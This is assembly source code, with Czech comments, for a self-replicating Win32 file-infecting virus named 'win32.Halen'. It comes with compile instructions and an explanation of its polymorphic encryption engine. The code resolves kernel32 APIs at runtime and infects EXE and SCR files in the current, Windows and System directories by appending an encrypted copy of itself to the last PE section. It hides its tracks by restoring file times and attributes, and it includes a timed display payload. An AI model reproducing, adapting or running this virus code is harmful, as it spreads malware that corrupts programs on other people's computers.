;                                                       win32.Halen virus
;                                                    (C)reated by pxR[MIONS] 
;                                                          January 2k+1      ≥
;                                                     ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
;
;
; Uvodem 
;  ƒƒƒƒƒƒŸ
;Dovolte me abych vam predstavil jeden z mych lame viru :) (muj prvni pod win)
;Tohle je win32 nerezidentrni PE infektor - prilepi se na konec PE souboru
;(zvetseni posledni sekce). Je to kodovanej virus jakymsi shit poly algoritmem :), 
;kterej jsem tak nejak narychlo sepsal. Kazdou sobotu v 19:xx (nebo 20:xx podle 
;rocniho obdobi ;) to zobrazi dialog a po jeho potvrzeni to zacne odsouvat obraz 
;doprava se zmenou pozadi.
;
; Jak kompilovat? 
;  ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
; tasm32 /m3 /ml Halen.asm,,;
; tlink32 /Tpe /aa Halen,Halen,,import32.lib
; pewrsec Halen.exe
;
;
; Par slov o tom, jak funguje ten poly shit (nic zajimavyho!): 
;  ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
;de/en crypt rutina je tvorena nahodne generovanymi instrukcemi ADD, SUB, XOR, ROR a
;ROL. 
;
;Na zacatku decrypt rutiny jsou vzdy istrukce: 
;CALL 0000000; POP EDI; ADD EDI,xxxxxxxx; MOV ESI,EDI; XOR EBP,EBP; CLD; LODSD; 
;
;Na konci decrypt rutiny jsou vzdy istrukce: 
;STOSD; INC EBP,xxxx; CMP EBP,xxxx; JNE xxxxxxxx
;
;Encrypt rutina vypada jinak. Neobsahuje uvodni (init) instrukce (CALL az LOSDS) a
;koncove instrukce (STOSD az JNE). Na jejim konci je RET. Pri kodovani pak vlozime
;do EAX hodnotu, kterou chceme zakodovat, provedeme CALL na tuto rutinu a obdrzime
;v EAX zakodovanou hodnotu.
;
;Registr, se kterym jsou provadeny instrukce ADD az ROL (pracovni registr) je volen 
;nahodne a muze byt uvnitr de/en crypt rutiny kdykoliv menen. Vybira se z 
;registru EAX az EDX.
;
;Nejdrive se vygeneruji data pro de/en crypt rutinu.
;napr:
;      87D0 82EAC28F 81C2EADC7143A0 87C9C990 C0C9C187 ...... 87C1
;                                   ^zmena prac. registru
;Na zacatku a na koci dat jsou vzdy 2 byty - instrukce XCHG prac.reg.,EAX (zacatek) a
;XCHG EAX,prac.reg. (konec). Jsou nutne k provadeni instrukci LODSD a STOSD.
;Po pocatecnim XCHG (2 byty) zacinaji vlastni data. 1. byte specifikuje instrukci
;dale nasleduje 2 byty, ktere specifikuji registr, ktery se pouzije. Jeden byte pro 
;decrypt a druhy pro encrypt rutinu (pouzije se vzdy jen jeden podle toho, jakou 
;rutinu chceme vygenerovat). Dale uz nasleduji data (1 nebo 4 byty - zalezi na 
;instrukci).
;
;Potom je z techto dat vytvarena bud encrypt rutina nebo decrypt rutina (viz vyse)


;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                             A TADY JE TEN BROUCEK                          €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€

.386p
.model flat

extrn        ExitProcess:proc
extrn        MessageBoxA:proc

.data
  FGMessage   db 'This is win32.Halen, a PE infector created by pxR[MIONS]',0h
  FGTitle     db 'win32.Halen',0
  
.code

  debug equ 1  ;!!!!!!

Start:
             cld                                     ;
             call OffsetTrick                        ;Starej dobrej offset trik
OffsetTrick: pop ebp                                 ;
             sub ebp,offset OffsetTrick              ;
             pushad                                  ;Ulozit registry (pro pripad chyby)
             lea eax,[ebp+offset ExceptHndl]         ;EAX=VA obsluhy chyby
             push eax                                ;
             push dword ptr fs:[0]                   ;
             mov dword ptr fs:[0],esp                ;Nastavit SEH frame
             mov eax,[ebp+offset origIP]             ;
             mov [ebp+offset retIP],eax              ;
             mov esi,[esp+28h]                       ;Odkud jsme byli volani?
             and esi,0FFFF0000h                      ;Zaokrouhlit na Page
             mov ecx,6h                              ;Opakovat max. 5 krat
 GetK01:     dec ecx                                 ;Dec pocitadlo
             jz Return2Host                          ;5. pokus?
             cmp word ptr [esi],'ZM'                 ;Byla nalezena MZ signatura?
             jz GetK02                               ;yo!
 GetK03:     sub esi,10000h                          ;Ne -> zkusime predchozi Page
             jmp GetK01                              ;Opakujeme
 GetK02:     mov edi,esi                             ;
             mov edx,esi                             ;Uschovat nalezenou VA kernelu
             add edi,[esi+3Ch]                       ;Posunem na zacatek PE headeru
             cmp word ptr [edi],'EP'                 ;Je to PE ?
             jz GetKOK                               ;yo -> mame kernel
             jmp GetK03                              ;ne -> hledame dal
 ExceptHndl:                                         ;
             mov esp,[esp+8]                         ;Obnovit puvodni ESP
 Return2Host:                                        ;
             pop dword ptr fs:[0]                    ;Obnovit SEH frame
             add esp,4                               ;Jeste ESP
             popad                                   ;Registry
             cmp ebp,0                               ;Prvni generace viru?
             je VirusEnd                             ;yo -> ukaz dialog
             lea ebx,[ebp+offset Start]              ;Vypocet originalni startIP
             sub ebx,[ebp+offset retIP]              ;
             jmp ebx                                 ;Navrat k hostiteli
     retIP dd ?                                      ;

 GetKOK:                                             ;
             xchg esi,edi                            ;
             mov [ebp+offset K32VA],edi              ;Ulozime nalezenou VA kernelu
             mov esi,[esi+78h]                       ;ESI=RVA na export table kernelu
             add esi,edi                             ;Prevedem RVA na VA
             add esi,18h                             ;
             lodsd                                   ;Number of Exported Names
             mov [ebp+offset K32EOMax],eax           ;Ulozit
             lodsd                                   ;Export Adress Table RVA
             add eax,edi                             ;RVA na VA
             mov [ebp+offset K32EAT],eax             ;Ulozit
             lodsd                                   ;Export Name Pointers Table RVA
             add eax,edi                             ;RVA na VA
             mov [ebp+offset K32ENPT],eax            ;Ulozit
             lodsd                                   ;Export Ordinals RVA
             add eax,edi                             ;RVA na VA
             mov [ebp+offset K32EO],eax              ;Ulozit
             lea esi,[ebp+offset APITableStr]        ;ESI=VA jmena prvni hledane API
             lea edi,[ebp+offset APITableVA]         ;EDI=VA tabulky VA API

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                             HLEDANI API FUNKCI                             €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 FindAllAPIs:
             lodsb                                   ;AL=delka nazvu API
             cmp al,0                                ;Konec?
             je FindAPIsOK                           ;yo -> hotovka
             movzx ecx,al                            ;ECX=AL
             push edi                                ;Uschovat EDI
             call FindAPIVA                          ;Hledat API!
             xchg esi,edi                            ;ESI<->EDI :)
             pop edi                                 ;Obnovit EDI
             test eax,eax                            ;API nenalezena (chyba)
             jz Return2Host                          ;Navrat do hostitele
             stosd                                   ;Ulozit nalezenou VA do tabulky
             jmp FindAllAPIs                         ;Hledat dalsi
                          
 FindAPIVA:                                          ;Vstupni parametry:
             xchg edi,esi                            ;   -esi=VA API jmena
             mov esi,[ebp+offset K32ENPT]            ;   -ecx=delka API jmena
             xor edx,edx                             ;Vynulovat pocitadlo
 FindAPI00:                                          ;ESI=Export Name Pointer Table VA
             lodsd                                   ;EAX=API name RVA
             add eax,[ebp+offset K32VA]              ;RVA na VA
             push esi                                ;Uschovat registry
             push edi                                ;
             push ecx                                ;
             push edx                                ;
             xchg eax,esi                            ;
             rep cmpsb                               ;Porovnat s nalezenym jmenem
             pop edx                                 ;Obnovit registry
             pop ecx                                 ;
             pop edi                                 ;
             pop esi                                 ;
             jz FindAPI01                            ;100% shodne -> nalezeno
             inc edx                                 ;Neshoduji se -> inc Pocitadlo
             cmp edx,[ebp+offset K32EOMax]           ;Prozkouseny vsechny Export. names?
             jae APINotFnd                           ;yo -> chyba
             jmp FindAPI00                           ;Zkusit dalsi nazev
 FindAPI01:                                          ;
             shl edx,1                               ;EDX=EDX*2
             mov esi,[ebp+offset K32EO]              ;
             add esi,edx                             ;ESI=offset K32EO+EDX
             xor eax,eax                             ;EAX=0 :)
             lodsw                                   ;EAX=API ordinal
             shl eax,2                               ;EAX=EAX*4
             mov esi,[ebp+offset K32EAT]             ;
             add esi,eax                             ;ESI=offset K32EAT+EAX
             lodsd                                   ;EAX=RVA k API
             add eax,[ebp+offset K32VA]              ;RVA na VA
             add edi,ecx                             ;EDI posunem na dalsi nazev API
             ret                                     ;Hotovo!

 APINotFnd:  xor eax,eax                             ;Nenalezeno -> EAX=0
             ret                                     ;Zpet

 FindAPIsOK:                                         ;
             call PayLoad                            ;Pust payload
             if debug                                ;Pokud je debug=1 budem infikovat
                lea esi,[ebp+testFName]              ;jen soubor test.exe
                call InfectCurrDir                   ;Infikuj aktualni adresar
                jmp Return2Host                      ;Navrat do hostitele
             endif                                   ;
             lea eax,[ebp+offset origDir]            ;Ulozime si aktualni adresar
             push eax                                ;
             push eax                                ;
             push 128h                               ;Max delka cesty
             call [ebp+offset GetCurrentDirectoryAVA];Zjistit aktualni adresar
             lea ebx,[ebp+offset currDir]            ;
             mov eax,[ebp+offset GetWindowsDirectoryAVA] ;Budeme menit adresar na WINDOWS
             call ISCh                                   ;Zmenit adresar & infikovat
             mov eax,[ebp+offset GetSystemDirectoryAVA]  ;Ted na WINDOWS\SYSTEM
             call ISCh                                   ;Zmenit adresar & infikovat
             call [ebp+offset SetCurrentDirectoryAVA]    ;Vratime puvodni adresar
             call ISCurr                                 ;A infikujem soubory v nem
             jmp Return2Host                             ;Navrat do hostitele

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                                INFEKCE ADRESARE                            €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 ISCh:            
             push 128h                               ;Maximalni delka
             push ebx                                ;VA nazvu adresare
             call eax                                ;Zjistit nazev (viz vyse)
             push ebx                                ;
             call [ebp+offset SetCurrentDirectoryAVA] ;Zmenit adresar
 ISCurr:                                             ;
             push ebx                                ;Uschovat pointer na nazev adresare
             lea esi,[ebp+offset exeMask]            ;Soubory *.EXE
             call InfectCurrDir                      ;Infikuj aktualni adresar 
             lea esi,[ebp+offset scrMask]            ;Soubory *.SCR
             call InfectCurrDir                      ;Infikuj aktualni adresar 
             pop ebx                                 ;Vytahnout pointer
             ret                                     ;Hotovka
 InfectCurrDir:                                      ;
             mov byte ptr [ebp+offset infCounter],3h ;Nastavit pocitadlo souboru
             lea eax,[ebp+offset FSearch]            ;EAX=offset Search record
             push eax                                ;
             push esi                                ;
             call [ebp+offset FindFirstFileAVA]      ;Najit prvni odpovidajici soubor
             inc eax                                 ;Chyba ?
             jz ICD01                                ;
             dec eax                                 ;Ne
             mov edx,eax                             ;Ulozit Handle
   ICD00:                                            ;
             test eax,eax                            ;Nalezen soubor?
             jz ICD01                                ;Ne -> konec
             xchg eax,edx                            ;Uschovat Handle
             lea esi,[ebp+offset FSearch.FName]      ;
             push eax                                ;Uschovat registry
             push esi                                ;
             call InfectFile                         ;Infikovat nalezenej soubor
             pop edi                                 ;Obnovit registry
             pop eax                                 ;
             test esi,esi                            ;Je pocitadlo nulovy? (viz nize)
             jz ICD01                                ;yo -> konec
             push eax                                ;Uschovat handle
             lea ebx,[ebp+offset FSearch]            ;
             push ebx                                ;
             push eax                                ;
             call [ebp+offset FindNextFileAVA]       ;Najit dalsi soubor
             pop edx                                 ;Obnovit handle
             jmp ICD00                               ;A zas od zacatku!
   ICD01:                                            ;
             ret                                     ;Infekce adresare hotova!

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                               INFIKACE SOUBORU                             €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 InfectFile:                                         ;
             mov eax,[ebp+offset FSearch.FSizeL]     ;Zkontrolujem velikost souboru
             cmp eax,4096                            ;
             jb InfError                             ;Mensi nez 4096B -> konec
             cmp eax,5000000                         ;
             ja InfError                             ;Vetsi nez cca 5MB -> konec
             push 00000080h                          ;80h='any file' atribut
             push esi                                ;ESI=VA na jmeno souboru
             call [ebp+offset SetFileAttributesAVA]  ;Nastavit atributy souboru
             inc eax                                 ;
             jz InfError                             ;Chyba?
             xor eax,eax                             ;EAX=0
             push eax                                ;Template handle (vzdy 0)
             push eax                                ;Atributy
             push 00000003h                          ;Open type (3 pro existujici soubor)
             push eax                                ;Security option
             inc eax                                 ;
             push eax                                ;Sharing mode (vzdy 1)
             push 0C0000000h                         ;Access mode (80000000+40000000)
             push esi                                ;^(generic read/write)^
             call [ebp+offset CreateFileAVA]         ;Otevrit soubor
             inc eax                                 ;
             jz RetAttr                              ;Chyba?
             dec eax                                 ;EAX=Handle otevrenyho souboru
             mov [ebp+offset IFHandle],eax           ;Ulozit
             mov ecx,VirSize                         ;ECX=Delka viru (vcetne dat)
             add ecx,[ebp+offset FSearch.FSizeL]     ;ECX=ECX+delka souboru
             add ecx,1000h                           ;plus nejaky misto :)
             mov [ebp+offset mapMem],ecx             ;Ulozit
             xor eax,eax                             ;
             push eax                                ;Filename handle (vzdy 0)
             push ecx                                ;Maximum size (ECX)
             push eax                                ;Minimum size (0)
             push 00000004h                          ;Page access rights (4 pro R/W)
             push eax                                ;Security attributes (vzdy 0)
             push dword ptr [ebp+offset IFHandle]    ;Handle otevrenyho souboru
             call [ebp+offset CreateFileMappingAVA]  ;Alokovat pamet
             cmp eax,0                               ;Nezadarilo se?
             je RetAttr                              ;
             mov [ebp+offset IMHandle],eax           ;Ulozit map handle
             push dword ptr [ebp+offset mapMem]      ;Kolik mapovat
             push 00000000h                          ;File offset high (0) \ kam mapovat
             push 00000000h                          ;File offset low  (0) /
             push 00000002h                          ;Map access mode (2 pro write)
             push eax                                ;Map handle
             call [ebp+offset MapViewOfFileVA]       ;Zavolat API
             cmp eax,0                               ;Vloudila se chybicka?
             je CloseMap                             ;
             xchg esi,eax                            ;ESI=adresa kam se to namapovalo
             lodsw                                   ;EAX=prvni 2 byty souboru
             sub esi,2                               ;Vratime ESI do puvodniho stavu
             mov [ebp+offset mapView],esi            ;Uschovat adresu
             cmp ax,'ZM'                             ;MZ signatura
             jne UnmapView                           ;Ne -> neni to EXE -> pryc!
             mov eax,esi                             ;
             add esi,[esi+3ch]                       ;Posunem se na zacatek PE hlavicky
             push esi                                ;Schovat
             sub esi,eax                             ;
             cmp esi,[ebp+FSearch.FSizeL]            ;Ukazuje ESI mimo rozsah souboru?
             pop esi                                 ;Obnovit
             ja UnmapView                            ;yo -> pryc!!!
             cmp word ptr [esi],'EP'                 ;Je to PE?
             jne UnmapView                           ;Ne -> shit!
             cmp dword ptr [esi+4ch],'NLAH'          ;Znacka zavirovaneho souboru
             je UnmapView                            ;Uz je zavirovan -> pryc
             mov eax,[esi+28h]                       ;
             mov [ebp+offset origIP],eax             ;Uschovat originalni IP
             mov eax,[esi+3ch]                       ;
             mov [ebp+offset fileAlign],eax          ;A taky FileAlign
             mov ebx,[esi+74h]                       ;EBX=pocet zaznamu v DataDir. array
             shl ebx,3                               ;EBX=EBX*8
             movzx ecx,word ptr [esi+6h]             ;ECX=pocet sekci v PE souboru
             dec ecx                                 ;Jednu odectem
             mov eax,28h                             ;
             mul ecx                                 ;EAX=EAX*ECX
             add eax,ebx                             ;
             add eax,78h                             ;78h je konec PE hlavicky
             add eax,esi                             ;EDI ted ukazuje na Section header
             xchg eax,edi                            ;posledni sekce
             mov ecx,[ebp+offset FSearch.FSizeL]     ;ECX=delka souboru
             mov ebx,[edi+14h]                       ;EDX=offset dat posledni sekce
             sub ecx,ebx                             ;ECX-EDX (velikost sekce)
             cmp ecx,[edi+8h]                        ;Porovnat s velikosti v headeru
             jb IGoOn                                ;Je mensi -> OK
             mov [edi+8h],ecx                        ;Vetsi -> upravime
             add [esi+1ch],ecx                       ;Upravit Size of code
             add [esi+50h],ecx                       ;Upravit Image size
     IGoOn:                                          ;
             mov dword ptr [esi+4ch],'NLAH'          ;Nastavit znacku
             or [edi+24h],0A0000020h                 ;Nastavime flags sekce (R/W/Code)
             mov eax,[edi+8h]                        ;EAX=virtualni velikost sekce
             push eax                                ;Uschovat
             add eax,VirSize                         ;EAX=EAX+delka viru vcetne dat
             mov ebx,[ebp+offset fileAlign]          ;EBX=File align
             push eax                                ;Uschovat
             div ebx                                 ;EAX=EAX DIV EBX, EDX=EAX MOD EBX
             pop eax                                 ;Obnovit
             sub ebx,edx                             ;FileAlign-EDX
             mov [edi+8h],eax                        ;Nova Virtual size
             add eax,ebx                             ;
             mov [edi+10h],eax                       ;Nova Size of Raw Data
             pop eax                                 ;Obnovit
             mov ebx,[edi+0ch]                       ;EBX=Virtual address
             add ebx,eax                             ;EBX=EBX+stara virtualni velikost
             mov [esi+28h],ebx                       ;Ulozit novou vstupni IP
             mov edx,[ebp+offset origIP]             ;EDX=originalni vstupni IP
             sub ebx,edx                             ;EBX=rozdil mezi starou a novou IP
             mov [ebp+offset origIP],ebx             ;Ulozit
             mov ecx,VirSize                         ;ECX=delka viru
             add ecx,255                             ;Plus nejaky misto
             add [esi+50h],ecx                       ;Pridat k Image size
             add [esi+1ch],ecx                       ;Pridat k Size of code
             mov edx,[edi+14h]                       ;EDX=ukazatel na data sekce (v souboru)
             add edx,eax                             ;(EAX=puvodni virt. velikost sekce)
             add edx,[ebp+offset mapView]            ;EDX=EDX+VA zacatku obrazu souboru
             xchg edi,edx                            ;EDI<->EDX ;)
             lea esi,[ebp+Start]                     ;ESI=VA zacatku tela viru
             mov ecx,offset CodeEnd-offset Start     ;ECX=delka viru (bez datovyho prostoru)
             call EncryptVirus                       ;Zakodovat a zkopirovat telo
             dec edi                                 ;
             sub edi,[ebp+offset mapView]            ;EDI=EDI-VA zacatku obrazu souboru
             mov [ebp+offset FSearch.FSizeL],edi     ;Ulozit novou delku souboru
             dec byte ptr [ebp+offset infCounter]    ;Snizit pocitadlo infekce
             jnz UnmapView                           ;Pokud neni nula jdeme dal
             xor esi,esi                             ;Jinak ESI=0
  UnmapView:                                         ;
             push dword ptr [ebp+offset mapView]     ;VA obrazu souboru v pameti
             call [ebp+offset UnmapViewOfFileVA]     ;
  CloseMap:                                          ;
             push dword ptr [ebp+offset IMHandle]    ;
             call [ebp+offset CloseHandleVA]         ;Uzavreme map handle
  RetTime:                                           ;
             lea eax,[ebp+offset FSearch.CrTime]     ;EAX=VA puvidniho casu souboru
             push eax                                ;Creation time
             add eax,16                              ;
             push eax                                ;Last write time
             sub eax,8                               ;
             push eax                                ;Last access time
             push dword ptr [ebp+IFHandle]           ;Handle souboru
             call [ebp+offset SetFileTimeVA]         ;Nastavime puvodni casy
             xor eax,eax                             ;
             push eax                                ;How2Move=0 (Od zacatku souboru)
             push eax                                ;Vzdalenost high (vzdy 0)
             push dword ptr [ebp+offset FSearch.FSizeL] ;Vzdalenost low
             push dword ptr [ebp+offset IFHandle]    ;Handle souboru
             call [ebp+offset SetFilePointerVA]      ;Nastavime ukazatel souboru
             push dword ptr [ebp+offset IFHandle]    ;Handle souboru
             call [ebp+offset SetEndOfFileVA]        ;Uriznem soubor
             push dword ptr [ebp+offset IFHandle]    ;Handle souboru
             call [ebp+offset CloseHandleVA]         ;Zavrem soubor
  RetAttr:                                           ;
             push dword ptr [ebp+offset FSearch.FAttr] ;VA atributu souboru
             lea eax,[ebp+offset FSearch.FName]      ;EAX=VA jmena souboru
             push eax                                ;
             call [ebp+offset SetFileAttributesAVA]  ;Nastavit puvodni atributy
  InfError:  ret                                     ;Hotovo!


;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                               KODOVANI VIRU                                €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 EncryptVirus:                                       ;
             push esi                                ;Uschovat registry
             push edi                                ;
             push ecx                                ;
             lea eax,[ebp+offset CryptData]          ;EAX=VA pole dat 
             call BuildCryptData                     ;Vytvorime data pro de/en krypt. rutinu
             xor ebx,ebx                             ;EBX=0
             mov bl,[ebp+offset CryptSize]           ;Pocet instrukci v crypt rutine
             add ebx,36                              ;Plus nejaky init instrukce
             add [ebp+offset origIP],ebx             ;Upravime rozdil IP
             mov edi,[esp+4]                         ;Obnovime ulozeny EDI
             mov ebx,offset CodeEnd-offset Start+1   ;EBX=kolik toho budem kodovat
             xor edx,edx                             ;
             inc edx                                 ;EDX=1 (encrypt)
             call CreateCrypt                        ;Vytvorit encrypt rutinu (na VA EDI)
             pop ecx                                 ;Obnovit registry
             pop edi                                 ;
             pop esi                                 ;
             shr ecx,2                               ;ECX=ECX DIV 4 (kodujem po DWORDech)
             inc ecx                                 ;+1
             push edi                                ;Schovat EDI
             xor ebx,ebx                             ;
             mov bl,byte ptr [ebp+offset CryptSize]  ;EBX=Delka vsech kodovacich instrukci
             add ebx,36                              ;Plus init instrukce
             push edi                                ;Schovat
             add edi,ebx                             ;EDI=EDI+EBX (tam budem ukladat
             pop ebx                                 ;zakodovana data)
    EV00:    lodsd                                   ;EAX=data k zakodovani
             push ebx                                ;Uschovat registry
             push ecx                                ;
             call ebx                                ;Zavolat vytvorenou kodovaci rutinu
             pop ecx                                 ;EAX=zakodovana data
             pop ebx                                 ;Obnovit registry
             stosd                                   ;Ulozit EAX
             dec ecx                                 ;Snizit pocitadlo
             jnz EV00                                ;Hotovo?
             pop eax                                 ;EAX=puvodni EDI (kam sme zacali ukladat)
             push edi                                ;Uschovat EDI (konec zak. tela)
             xchg eax,edi                            ;Prohodit
             mov ebx,offset CodeEnd-offset Start+1   ;EBX=code size
             xor edx,edx                             ;EDX=0 (decrypt)
             call CreateCrypt                        ;Vytvorit decrypt rutinu (na VA EDI)
             pop edi                                 ;Obnovit EDI
             ret                                     ;Hotovo!

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                          GENEROVANI DE/ENCRYPT RUTIN                       €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 CreateCrypt:                                        ;EDX=0 pro decrypt, 1 pro encrypt
             push ebx                                ;Schovat (EBX=kolik bytu de/kodujem)
             lea esi,[ebp+offset CryptData]          ;ESI=VA nagenerovanych dat
             mov ebx,1                               ;Nastavime pocitadlo
             test edx,edx                            ;Decrypt ?
             jnz CC00                                ;Ne -> pokracujem na CC00
             lea esi,[ebp+offset DecryptStart]       ;yo -> zkopirujem init instrukce
             movsd                                   ;Pretahnout 2xDWORD
             movsd                                   ;
             xor eax,eax                             ;
             mov al,byte ptr [ebp+offset CryptSize]  ;EAX=delka vsech de/encrypt intrukci
             add eax,31                              ;Plus delka init instrukci
             stosd                                   ;Ulozime pozici odkud se dekoduje
             movsd                                   ;A pretahnem zbytek init instrukci
             movsw                                   ;
             mov bl,byte ptr [ebp+offset CryptNr]    ;Nastavime pocitadlo
             call NI                                 ;Nastav ESI na posledni crypt instr.
             add esi,3h                              ;Pridej jeji delku
             add esi,ecx                             ; -||-
    CC00:    movsw                                   ;Pretahni pocatecni nebo
    CC01:                                            ;koncovy XCHG (zalezi na EDX)
             call NI                                 ;Nastav ESI na BLtou crypt instr.
             movsb                                   ;Pretahni prvni byte instrukce
             add esi,edx                             ;Encrypt nebo decrypt registr
             movsb                                   ;Pretahni ho
             test edx,edx                            ;Pokud tvorime decrypt musime
             jnz CC06                                ;upravit ESI
             inc esi                                 ;!!! V ECX je delka instrukce-2!!!
    CC06:    movsb                                   ;Pretahni dalsi byte instrukce
             dec ecx                                 ;Zkopirovano vse?
             jnz CC06                                ;Ne -> val dal
             test edx,edx                            ;Decrypt?
             jnz CC02                                ;Nee -> CC02
             dec bl                                  ;Sniz pocitadlo
             jz CC05                                 ;Vsechny instr. zkopirovany?
             jmp CC01                                ;ne -> Opakujem pro dalsi instr.
    CC02:    inc bl                                  ;Zvys pocitadlo
             cmp bl,byte ptr [ebp+offset CryptNr]    ;Vsechny instr. zkopirovany?
             ja CC05                                 ;yo -> konec
             jmp CC01                                ;ne -> opakujem
    CC05:                                            ;
             pop eax                                 ;Obnov (push EBX na zacatku)
             test edx,edx                            ;Decrypt?
             jnz CC03                                ;Ne -> zkopiruj RET a konec
             lea esi,[ebp+offset CryptData]          ;Zkopiruj XCHG
             movsw                                   ;
             lea esi,[ebp+offset DecryptEnd]         ;Zkopiruj koncove instrukce (CMP)
             movsd                                   ;
             shr eax,2                               ;EAX=EAX DIV 4
             inc eax                                 ;+1
             stosd                                   ;Uloz hodnotu k CMP
             movsw                                   ;Pretahni intr. JNE
             mov eax,0FFFFFFFAh                      ;
             xor ebx,ebx                             ;
             mov bl,byte ptr [ebp+offset CryptSize]  ;EBX=delka crypt instrukci
             add ebx,13                              ;Plus init
             sub eax,ebx                             ;Vypocet skoku JNE
             stosd                                   ;Uloz to
             jmp CC04                                ;Hotovo
    CC03:    mov bl,byte ptr [ebp+offset CryptNr]    ;Pro encrypt prethnem jen XCHG
             call NI                                 ;Nastav ESI na posledni istrukci
             add esi,3h                              ;
             add esi,ecx                             ;Posun ESI za ni
             movsw                                   ;Pretahni ten XCHG
             mov eax,0c3h                            ;EAX=0C3h (RET)
             stosb                                   ;Uloz
    CC04:    ret                                     ;Hotovo

    NI:                                              ;
             push eax                                ;Neznicit EAX!
             lea esi,[ebp+offset CryptData+2]        ;Nastav ESI na 1. istrukci
             xor bh,bh                               ;Nuluj pocitadlo
       NI00:                                         ;
             xor ecx,ecx                             ;ECX=0 ;)
             lodsb                                   ;AL=1 byte instrukce
             cmp al,81h                              ;Je to 6 bytova instrukce?
             jne NI01                                ;
             add esi,3h                              ;ESI=ESI+3
             add ecx,3h                              ;ECX=3
       NI01: add esi,3h                              ;ESI=ESI+3
             add ecx,1h                              ;ECX=ECX+1
             inc bh                                  ;Zvys pocitadlo
             cmp bh,bl                               ;Hledana instrukce?
             jne NI00                                ;Ne -> opakuj!
       NI02: sub esi,ecx                             ;Nastav ESI na zac. instrukce
             sub esi,3h                              ;
             pop eax                                 ;Obnov EAX
             ret                                     ;Zpet!
             
